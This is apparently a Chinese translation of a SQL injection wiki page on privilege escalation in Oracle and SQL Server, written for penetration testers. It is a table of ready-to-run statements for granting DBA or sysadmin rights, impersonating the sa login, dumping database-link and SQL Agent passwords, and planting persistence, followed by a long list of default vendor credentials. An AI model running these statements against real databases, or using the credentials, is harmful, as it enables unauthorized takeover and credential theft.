### 提升特权 {docsify-ignore-all}


某些功能需要特权用户，并且为了升级漏洞，特权用户始终是第一步。


#### MySQL

还没有数据，如果您知道任何有用的方法，请在我们的[Github](https://github.com/NetSPI/SQLInjectionWiki)上做出贡献！



#### Oracle

`*`需要特权用户

| 描述   |      语句     |  
|----------|:-------------:|
| 转储所有DBA用户名 |      	SELECT username FROM user\_role\_privs WHERE granted_role='DBA';    |  
| 建立DBA用户  |     `*` GRANT DBA to USER     |  
| 创建过程   |      `CREATE OR REPLACE PROCEDURE "SYSTEM".netspi1 (id IN VARCHAR2) AS PRAGMA autonomous_transaction; EXECUTE IMMEDIATE 'grant dba to scott'; COMMIT; END; BEGIN SYSTEM.netspi1('netspi'); END;`|  
| 查找数据库链接  |      SELECT \* FROM DBA\_DB\_LINKS<br />SELECT \* FROM ALL\_DB\_LINKS<br />SELECT \* FROM USER\_DB\_LINKS     |  
| 查询数据库链接  |      SELECT \* FROM sales@miami -- minimum for preconfigured<br />SELECT \* FROM harold@netspi.com -- standard usage for selecting table from schema on remote server<br />SELECT \* FROM harold@netspi.com@hq\_1 -- standard usage for selecting table from schema on remote server instance<br />SELECT db\_link,password FROM user\_db\_links WHERE db_link LIKE 'TEST%''<br />SELECT name,password FROM sys.link$ WHERE name LIKE 'TEST%';<br />SELECT name,passwordx FROM sys.link$ WHERE name LIKE 'TEST%';     |  
| 在数据库链接上执行存储过程  |      EXEC mySchema.myPackage.myProcedure@myRemoteDB( 'someParameter' );<br />SELECT dbms\_xmlquery.getxml('select \* from emp') FROM harold@netspi.com     |  
| 创建数据库链接   |      CREATE SHARED PUBLIC DATABASE LINK supply.us.netspi.com; -- connected user setup<br />CREATE SHARED PUBLIC DATABASE LINK supply.us.netspi.com CONNECT TO harold AS tiger; -- standard defined user/pass<br />CREATE SHARED PUBLIC DATABASE LINK hq.netspi.com.com@hq\_1 USING 'string\_to\_hq\_1'; -- instance specific<br />CREATE SHARED PUBLIC DATABASE LINK link\_2 CONNECT TO jane IDENTIFIED BY doe USING 'us\_supply'; -- defined user<br />pass     |  
| 删除链接  |      	DROP DATABASE LINK miami;     |  


#### SQL Server

`*`需要特权用户。以下查询需要各种权限类型。请继续关注详细的权限提升路径。

| 描述   |      语句     |  
|----------|:-------------:|
| 建立DBA用户   |      \* EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin';    |  
| 授予所有自定义对象的执行权限   |      SELECT 'grant exec on ' + QUOTENAME(ROUTINE\_SCHEMA) + '.' +<br />QUOTENAME(ROUTINE\_NAME) + ' TO test' FROM INFORMATION\_SCHEMA.ROUTINES<br />WHERE OBJECTPROPERTY(OBJECT\_ID(ROUTINE_NAME),'IsMSShipped') = 0 ;     |  
| 授予执行所有存储过程 |      CREATE ROLE db\_executor<br />GRANT EXECUTE TO db\_executor<br />exec sp\_addrolemember 'db\_executor', 'YourSecurityAccount'     |  
| UNC路径注入   |      [https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e](https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e)<br />[https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/)     |  
| 检测非模拟登录   |      SELECT distinct b.name FROM sys.server\_permissions a INNER JOIN sys.server\_<br />principals b ON a.grantor\_principal\_id = b.principal\_id WHERE a.permission_name = 'IMPERSONATE'     |  
| 模拟登录 <br />注意：REVERT会将您带回原始登录名。  |     EXECUTE AS LOGIN = 'sa'; SELECT @@VERSION;     |  
| 创建sysadmin用户   |      `*` USE [master]<br />GO<br />CREATE LOGIN [test] WITH PASSSWORD=N 'test', DEFAULT\_DATABASE=[master], CHECK\_EXPIRATION=OFF, CHECK\_POLICY=OFF<br />GO<br />EXEC master..sp_addsrvrolemember @loginame=N'test', @rolename=N'sysadmin'<br />GO     |  
| 创建sysadmin用户   |      `*` EXEC sp\_addlogin 'user', 'pass';<br />`* `EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin';     |  
| 删除用户   |     ` *` EXEC sp_droplogin 'user';     |  
| 检索SQL代理连接密码   |      exec msdb.dbo.sp\_get\_sqlagent_properties     | 
| 检索DTS连接密码   |      select msdb.dbo.rtbldmbprops     |  
| 获取sysadmin作为本地管理员   |      [https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/](https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/)     |  
| 启动存储过程  |      [https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)     |  
| 触发器创建  |      [https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/](https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/)     |  
| Windows自动登录密码  |      [https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/](https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/)    | 
| xp_regwrite非sysadmin执行   |      [https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e](https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e)     |  
| 具有可信赖数据库的存储过程   |      [https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases](https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases)     |  
| 存储过程用户模拟   |      [https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/)     |  
| 默认密码   |      sa:sa<br />sa:[empty] <br />[username]:[username]     |  
| 实例的默认密码（实例名称，用户，密码）   |      "ACS","ej","ej"<br />"ACT7","sa","sage" <br />"AOM2","admin","ca\_admin" <br />"ARIS","ARIS9","*ARIS!1dm9n#" <br />"AutodeskVault","sa","AutodeskVault@26200" "BOSCHSQL","sa","RPSsql12345" <br />"BPASERVER9","sa","AutoMateBPA9" <br />"CDRDICOM","sa","CDRDicom50!" <br />"CODEPAL","sa","Cod3p@l" <br />"CODEPAL08","sa","Cod3p@l" <br />"CounterPoint","sa","CounterPoint8" <br />"CSSQL05","ELNAdmin","ELNAdmin" <br />"CSSQL05","sa","CambridgeSoft\_SA" <br />"CADSQL","CADSQLAdminUser","Cr41g1sth3M4n!" <br />"DHLEASYSHIP","sa","DHLadmin@1" <br />"DPM","admin","ca\_admin" <br />"DVTEL","sa","" <br />"EASYSHIP","sa","DHLadmin@1" <br />"ECC","sa","Webgility2011" <br />"ECOPYDB","e+C0py2007\_@x","e+C0py2007\_@x" <br />"ECOPYDB","sa","ecopy" <br />"Emerson2012","sa","42Emerson42Eme" <br />"HDPS","sa","sa" <br />"HPDSS","sa","Hpdsdb000001" <br />"HPDSS","sa","hpdss" <br />"INSERTGT","msi","keyboa5" <br />"INSERTGT","sa","" <br />"INTRAVET","sa","Webster#1" <br />"MYMOVIES","sa","t9AranuHA7" <br />"PCAMERICA","sa","pcAmer1ca" <br />"PCAMERICA","sa","PCAmerica" <br />"PRISM","sa","SecurityMaster08" <br />"RMSQLDATA","Super","Orange" <br />"RTCLOCAL","sa","mypassword" <br />"SALESLOGIX","sa","SLXMaster" <br />"SIDEXIS\_SQL","sa","2BeChanged" <br />"SQL2K5","ovsd","ovsd" <br />"SQLEXPRESS","admin","ca\_admin" <br />"STANDARDDEV2014","test","test" "TEW\_SQLEXPRESS","tew","tew" <br />"vocollect","vocollect","vocollect" <br />"VSDOTNET","sa","" <br />"VSQL","sa","111"     |  















